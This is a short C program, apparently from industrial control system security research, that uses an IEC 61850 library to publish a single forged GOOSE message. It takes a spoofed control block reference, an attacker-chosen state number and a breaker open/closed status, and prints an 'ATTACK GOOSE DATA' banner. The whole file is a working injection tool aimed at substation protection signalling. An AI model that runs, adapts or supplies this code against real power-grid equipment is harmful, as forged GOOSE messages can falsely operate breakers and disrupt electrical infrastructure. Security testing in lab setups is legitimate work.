#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <time.h>
#include <curl/curl.h>
#include <json-c/json.h>
#include <pthread.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "goose_receiver.h"
#include "goose_subscriber.h"
#include "hal_thread.h"
#include "logging.h"
#include "hal_time.h"

static volatile int running = 1;
static int rdso_status;
static uint32_t stNum;
static uint32_t sqNum = 0;
static bool statusBool;

char gocbRef[100] = "X/LLN0$GO$gcbAnalogValues";
char datSet[100] = "X/LLN0$AnalogValues";
char goID[100] = "X";

// Signal handler for graceful termination
static void sigint_handler(int signalId) {
    running = 0;
}

void formatUtcTime(char* buffer, size_t buffer_size, uint64_t epoch_ms) {
    time_t rawtime = epoch_ms / 1000;
    struct tm * ptm = gmtime(&rawtime);

    strftime(buffer, buffer_size, "%b %d, %Y %H:%M:%S", ptm);
    // Add milliseconds manually since strftime doesn't support them
    int milliseconds = epoch_ms % 1000;
    char ms_buffer[50];
    sprintf(ms_buffer, ".%03d UTC", milliseconds);
    strcat(buffer, ms_buffer);
}

// Publish function
void publish(GoosePublisher publisher) {
    char published_timestamp_str[1024];
    LinkedList dataSetValues = LinkedList_create();
    statusBool = (rdso_status == 1); // True for CLOSED, False for OPEN
    LinkedList_add(dataSetValues, MmsValue_newBoolean(statusBool));

    // Generate the current timestamp and set it for the publisher
    uint64_t currentTime = Hal_getTimeInMs();
    GoosePublisher_setTimestamp(publisher, currentTime);

    formatUtcTime(published_timestamp_str, sizeof(published_timestamp_str), currentTime);

    if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
        log_error("Error sending GOOSE message");
    }

    printf("******ATTACK GOOSE DATA******\nt: %s\nstNum: %u\nallData: %s\n",
           published_timestamp_str, stNum, rdso_status == 1 ? "TRUE" : "FALSE");

    LinkedList_destroyDeep(dataSetValues, (LinkedListValueDeleteFunction)MmsValue_delete);
}

int main(int argc, char **argv) {
    signal(SIGINT, sigint_handler);

    char *interface = (argc > 1) ? argv[1] : "ens33";
    log_info("Using interface %s", interface);

    stNum = (argc > 2) ? atoi(argv[2]) : 100;
    rdso_status = (argc > 3) ? atoi(argv[3]) : 1;

    uint8_t dstMac[6] = {0x01, 0x0c, 0xcd, 0x01, 0x00, 0x01};

    CommParameters gooseCommParameters = {0};
    gooseCommParameters.appId = 1000;
    memcpy(gooseCommParameters.dstAddress, dstMac, 6);
    GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);

    if (publisher == NULL) {
        log_error("Failed to create GoosePublisher");
        return EXIT_FAILURE;
    }

    GoosePublisher_setGoCbRef(publisher, gocbRef);
    GoosePublisher_setConfRev(publisher, 1);
    GoosePublisher_setDataSetRef(publisher, datSet);
    GoosePublisher_setTimeAllowedToLive(publisher, 5000);
    GoosePublisher_setGoID(publisher, goID);
    GoosePublisher_setStNum(publisher, stNum);
    GoosePublisher_setSqNum(publisher, sqNum);
    publish(publisher);

    GoosePublisher_destroy(publisher);

    log_info("Application terminated gracefully");

    return 0;
}
